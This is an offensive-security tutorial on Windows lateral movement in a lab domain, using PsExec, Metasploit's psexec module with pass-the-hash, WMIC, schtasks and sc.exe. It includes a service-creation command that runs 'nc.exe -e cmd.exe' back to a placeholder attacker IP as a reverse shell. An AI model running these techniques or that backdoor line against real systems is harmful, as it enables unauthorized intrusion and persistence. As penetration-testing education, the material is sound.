# Windows Remote Command Execution with PsExec and WMIC

## Scenario

You have obtained remote credentials of a user on a target network — in this case administrative credentials within a Windows AD domain. You need to run commands on a remote system where you do not have an active interactive shell. What tools let you execute commands remotely, given admin credentials (or an account in the domain's administrative group)?

## SMB & Administrative Network Shares

Windows uses **Server Message Block (SMB)** as the primary protocol for remote access, file sharing, and remote management. With network SMB access and valid credentials, you can execute remote commands across the network.

Administrative shares exposed over SMB that must be open for remote execution:
- **`ADMIN$`** share
- Administrative drive shares like **`C$`**

If those shares are accessible, you can connect, stage files or modifications, and use internal utilities to execute commands remotely.

## Lateral Movement Context

Lateral movement = moving from one compromised system to another on the same network segment. From an existing victim shell, specify the target's IP, supply harvested credentials, authenticate, and pop an interactive shell on the target.

The two most commonly used tools are **PsExec** and **WMIC** (Windows Management Instrumentation Command-line).

## PsExec — Sysinternals

**PsExec** is a free utility from the **Microsoft Sysinternals** suite, also built into frameworks like Metasploit. Despite the "PS" prefix it is **not** PowerShell — it's a standalone command-line executable not pre-installed in Windows; it must be downloaded separately.

Downloading external binaries onto a target is risky: AV/EDR often flags the **PSTools** suite, and enterprises may restrict unauthorized third-party binaries. In those cases Metasploit is advantageous because the functionality is built in.

Microsoft created PsExec as a modern replacement for legacy protocols like **Telnet** (which requires enabling the Telnet service and installing the client). PsExec requires **no client software pre-installed on the target** — you only need `psexec.exe` on the attacking machine.

### Lab environment
- **Domain Controller (`TechHackerDC`):** Windows Server 2019, logged in as built-in **`Administrator`**; also the primary DNS server.
- **Domain name:** `bittu_tech.local`.
- **Workstation 1 (`UserPC1`):** Windows 10 Enterprise, logged in as domain user **`Bob`** (member of **Administrators** → **Domain Admin**).
- **Workstation 2 (`UserPC2`):** logged in as domain user **`Alice`** (standard user, no admin rights).
- **Additional user (`Sean`):** admin account cloned from the built-in Administrator role.
- Both user accounts stored centrally in **`ntds.dit`** on the DC.

We execute remote commands against the Domain Controller directly from `UserPC1`.

### Prerequisites
1. **Administrative credentials** on the remote host.
2. **SMB access** (port 445) reachable on the target.
3. **Accessible `ADMIN$` share** enabled over SMB.
4. **Remote management enabled** and firewalls allowing inbound SMB.

Missing any condition → access denied or connection errors. Commands execute under the exact privilege level of the account supplied.

### Windows PsExec syntax

```
psexec \\<TARGET_IP> -u <USERNAME> -p <PASSWORD> <COMMAND>
```

Testing against the DC (`192.168.164.131`) with Bob's credentials:

```
psexec \\192.168.164.131 -u Bob -p 123 ipconfig
```

**Troubleshooting & version quirks**
- Native Sysinternals PsExec on Windows is noticeably slow as it connects and initializes the remote `PSEXESVC` service.
- Error `The user has not been granted the requested logon type at this computer` → check version quirks. PsExec **2.2** had a known bug causing "Access Denied" even with valid credentials.
- In version **2.30+**, supply the **`-i`** switch (interactive mode) for the command to execute and return properly.
- **`-d` (detached mode)** — runs the command in the background without waiting for the process to terminate, suppressing console output. Without `-d`, stdin/stdout is channelized so output streams into your terminal.

Adding `-i` executes the remote command and displays the DC's IP config inline. An attacker can launch arbitrary binaries, backdoors, reverse listeners, or stage persistence this way.

### PsExec via Metasploit (Pass-the-Hash)

In Metasploit, PsExec is the module **`exploit/windows/smb/psexec`**. (Cataloged as an exploit, it's technically an abuse of legitimate administrative functionality, not a software vulnerability.)

```
use exploit/windows/smb/psexec
set RHOSTS 192.168.164.131
set SMBUser Bob
set SMBPass 123
```

**Pass-the-Hash capability:** `SMBPass` accepts either a plaintext password **or** an **NTLM password hash**. A harvested admin NT hash can be passed directly without cracking, initiating a **Pass-the-Hash** attack.

Executing opens a Meterpreter session almost instantly (far faster than native PsExec). `sysinfo` confirms connection to `TechHackerDC`; dropping to a Windows shell and running `whoami` returns **`NT AUTHORITY\SYSTEM`** — the highest privilege on the DC.

## WMIC — Windows Management Instrumentation Command-line

Unlike PsExec, WMIC is **pre-installed by default** across Windows from XP Professional through Windows 10, so no external binaries need uploading. It interacts with the WMI repository for granular admin control of local and remote systems. Same prerequisites: remote reachability and admin credentials.

### Syntax

```
wmic /node:<TARGET_IP> /user:<USERNAME> /password:<PASSWORD> process call create "<COMMAND>"
```

Against the DC:

```
wmic /node:192.168.164.131 /user:Bob /password:123 process call create "ipconfig"
```

**Detached execution:** unlike PsExec, WMIC spawns the command in an independent, detached process. It does **not** display stdout inline — it returns an execution status code and the created **Process ID (PID)**. Commands that terminate immediately (like `ipconfig`) exit as soon as execution completes.

To verify persistence, spawn a persistent process like `cmd.exe` (returns `ProcessId = 5028`). Query running processes:

```
wmic /node:192.168.164.131 /user:Bob /password:123 process list brief
```

confirms PID 5028 (`cmd.exe`) is running in the background on the DC.

**Multi-host execution:** target multiple machines by supplying a file of IPs: `/node:@"hosts.txt"`. Terminate processes remotely with `process where ProcessId=<PID> delete`.

## Alternative Native Execution Vectors

### Scheduled Tasks (`schtasks`)

The legacy `at` command is deprecated, but `schtasks` remains supported. Schedule commands, scripts, or payloads to run at specific times or recurring intervals on a remote system:

```
schtasks /s <TARGET_IP> /u <USERNAME> /p <PASSWORD> /create /tn <TASK_NAME> /tr <BINARY_PATH> /sc <SCHEDULE> /st <START_TIME>
```

### Service Control Manager (`sc.exe`)

Create and start custom Windows services on remote machines:

1. Establish an authenticated network session with `net use`:
    ```
    net use \\<TARGET_IP> /user:<USERNAME> <PASSWORD>
    ```
2. Query existing services: `sc \\<TARGET_IP> query`.
3. Create a new service pointing to an executable or command payload (note the required space after `binPath=`):
    ```
    sc \\<TARGET_IP> create BackdoorService binPath= "cmd.exe /c C:\nc.exe -e cmd.exe <ATTACKER_IP> <PORT>"
    ```
4. Start the service remotely to execute the payload under `SYSTEM` context:
    ```
    sc \\<TARGET_IP> start BackdoorService
    ```

## Summary

These are the primary native and framework-based methods for remote command execution across Windows/AD networks. Mastering them provides the foundation for lateral movement, persistence, and advanced domain attacks — including Pass-the-Hash, Silver Tickets, and Golden Tickets.
